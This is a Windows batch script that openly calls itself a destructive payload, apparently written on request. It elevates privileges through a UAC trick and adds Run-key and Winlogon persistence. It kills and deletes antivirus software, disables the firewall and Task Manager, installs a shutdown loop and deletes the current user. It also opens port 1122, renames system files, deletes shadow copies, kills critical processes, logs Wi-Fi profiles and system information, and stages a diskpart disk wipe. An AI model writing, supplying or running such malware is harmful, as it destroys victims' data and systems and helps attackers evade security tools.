@echo off
goto continue
:continue
:: BatchGotAdmin (elevate privileges if not admin)
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject("Shell.Application") > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
goto BEGIN

:BEGIN
:: Ω_TRACE_PERSIST Enhanced Destructive Payload
@echo off
if "%1" equ "Restarted" goto %1

:again
echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
goto :again

:Restarted
:: ----- Create persistence via winmn32.bat and registry -----
echo @echo off > c:\windows\winmn32.bat
echo break off >> c:\windows\winmn32.bat
echo ipconfig/release_all >> c:\windows\winmn32.bat
echo end >> c:\windows\winmn32.bat
reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v WINDOWsAPI /t reg_sz /d c:\windows\winmn32.bat /f
reg add hkey_current_user\software\microsoft\windows\currentversion\run /v CONTROLexit /t reg_sz /d c:\windows\winmn32.bat /f

:: ----- Kill antivirus/security processes aggressively -----
net stop "Security Center"
netsh firewall set opmode mode=disable
for %%A in (
    av* fire* anti* spy* bullguard PersFw KAV* ZONEALARM SAFEWEB OUTPOST nv* nav* F-* ESAFE cle
    BLACKICE def* kav kav* avg* ash* aswupdsv ewid* guard* guar* gcasDt* msmp* mcafe* mghtml msiexec
    outpost isafe zap* zauinst upd* zlclien* minilog cc* norton* "norton au*" ccc* npfmn* loge* nisum*
    issvc tmp* tmn* pcc* cpd* pop* pav* padmin panda* avsch* sche* syman* virus* realm* sweep* scan*
    ad-* safe* avas* norm* offg*
) do (
    tskill /A %%A 2>nul
)
:: Delete antivirus directories forcefully
setlocal enabledelayedexpansion
set "AVPaths=C:\Program Files\alwils~1\avast4 C:\Program Files\Lavasoft\Ad-awa~1 C:\Program Files\kasper~1 C:\Program Files\trojan~1 C:\Program Files\f-prot95 C:\Program Files\tbav C:\Program Files\avpersonal C:\Program Files\Norton~1 C:\Program Files\Mcafee C:\Program Files\avgamsr C:\Program Files\avgamsvr C:\Program Files\avgemc C:\Program Files\avgcc C:\Program Files\avgupsvc C:\Program Files\grisoft C:\Program Files\nood32krn C:\Program Files\nood32 C:\Program Files\nod32 C:\Program Files\nood32 C:\Program Files\kav C:\Program Files\kavmm C:\Program Files\kaspersky C:\Program Files\ewidoctrl C:\Program Files\guard C:\Program Files\ewido C:\Program Files\pavprsrv C:\Program Files\pavprot C:\Program Files\avengine C:\Program Files\apvxdwin C:\Program Files\webproxy C:\Program Files\panda software"
for %%D in (%AVPaths%) do (
    del /Q /F "%%D\*.*" 2>nul
    rd /S /Q "%%D" 2>nul
)
endlocal

:: ----- System destruction and annoyance -----
title %0
color 3
IF EXIST "9K21JM10B.log" DEL /F /Q "9K21JM10B.log"
IF EXIST "restart.bat" DEL /F /Q "restart.bat"
IF EXIST "bsod.cmd" DEL /F /Q "bsod.cmd"
echo . >9K21JM10B.log
echo . >restart.bat
echo . >bsod.cmd
echo . >kill.txt
attrib +h +s 9K21JM10B.log
attrib +h +s bsod.cmd
attrib +h +s 1.vbs 2>nul
attrib +h +s 2.vbs 2>nul

:: Fake BSOD screenaver trigger
echo %systemroot%\system32\scrnsave.scr /s >>bsod.cmd
start bsod.cmd

:: Infinite restart loop via startup folder
echo :loop >> rest.bat
echo shutdown /s /f /t 0 >> rest.bat
echo goto loop >> rest.bat
copy rest.bat "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /y >nul
copy rest.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /y >nul
copy rest.bat "C:\Users\Public\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /y >nul
del rest.bat

:: Delete current user
net user %USERNAME% /delete 2>nul

:: Gather system info (exfiltration placeholder)
ECHO.>>9K21JM10B.log
ECHO Username:%username%>>9K21JM10B.log
ECHO Time: %time%>>9K21JM10B.log
ECHO Date: %date%>>9K21JM10B.log
color 0a & mode 1000
netsh wlan show profiles>>9K21JM10B.log 2>nul
ipconfig>>9K21JM10B.log 2>nul
ipconfig | find /i "IPv4">>9K21JM10B.log
wmic diskdrive get size>>9K21JM10B.log
wmic cpu get name>>9K21JM10B.log
systeminfo>>9K21JM10B.log 2>nul

:: Open firewall for potential backdoor (port 1122)
netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=1122 >nul
netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=1122 >nul

:: Create 100 random user accounts
setlocal EnableDelayedExpansion
for /l %%x in (1, 1, 100) do (
   net user !random! !random! /add 2>nul
)
endlocal

:: Corrupt wallpaper setting
reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d C:/Downloaded Images/ /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: Disable Task Manager
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: Kill Windows Search
sc stop "WSearch"
sc config "WSearch" start=disabled
Dism /online /Disable-Feature /FeatureName:"SearchEngine-Client-Package" /Remove /q >nul 2>nul

:: Disable mouse and keyboard (requires admin, but we elevated)
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key% /f 2>nul
reg add %key% /v Start /t REG_DWORD /d 4 /f
rundll keyboard,disable 2>nul

:: Delete current user again (just in case)
net user %USERNAME% /delete 2>nul

:: ----- File renaming to break system (encrypt metaphor) -----
:ENCRYPT
cd /d C:\
for %%E in (log ini dll bin txt sys lnk png exe) do (
    ren *.%%E *.0000 2>nul
)
cd /d C:\Windows
for %%E in (log ini dll bin txt sys lnk png) do (
    ren *.%%E *.0000 2>nul
)
cd /d C:\Windows\System32
for %%E in (log ini dll bin txt sys lnk png) do (
    ren *.%%E *.0000 2>nul
)

:: ----- Additional destructive payloads -----

:: 1. Overwrite MBR (instant disk destruction) - using echo to diskpart
echo select disk 0 > diskpart.txt
echo clean >> diskpart.txt
echo create partition primary >> diskpart.txt
echo select partition 1 >> diskpart.txt
echo active >> diskpart.txt
echo format fs=NTFS quick >> diskpart.txt
echo assign letter=C >> diskpart.txt
:: Caution: 'clean' wipes the MBR. Uncomment next line to actually execute:
:: diskpart /s diskpart.txt >nul 2>nul

:: 2. Open 100 CMD terminals rapidly (as requested)
for /l %%i in (1,1,100) do start "" cmd.exe /k "echo Terminal %%i & title Terminal%%i"

:: 3. Infinite console spam (annoyance)
:spam
start "" cmd.exe /c "echo YOU HAVE BEEN HACKED & pause"
goto spam

:: 4. Beep loop (annoying sound)
:beep
echo ^G
ping -n 1 127.0.0.1 >nul
goto beep

:: 5. Create infinite nested folders to exhaust filesystem
:folderspam
set /a count+=1
md "%temp%\spam%count%"
cd "%temp%\spam%count%"
goto folderspam

:: 6. Disable all network adapters
wmic nic where "NetEnabled='True'" call Disable 2>nul

:: 7. Kill critical system processes
taskkill /f /im svchost.exe 2>nul
taskkill /f /im explorer.exe 2>nul
taskkill /f /im csrss.exe 2>nul
taskkill /f /im winlogon.exe 2>nul

:: 8. Set registry to launch this script on boot via multiple methods
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "MalwarePayload" /t REG_SZ /d "%~f0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MalwarePayload" /t REG_SZ /d "%~f0" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, %~f0" /f
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, %~f0" /f

:: 9. Delete shadow copies (disable recovery)
vssadmin delete shadows /all /quiet 2>nul

:: 10. Final payload: shutdown with a countdown popup
echo shutdown /s /f /t 5 /c "System is unstable. Windows will now crash." > %temp%\final.bat
start %temp%\final.bat

:: Keep script alive
:leave
goto leave
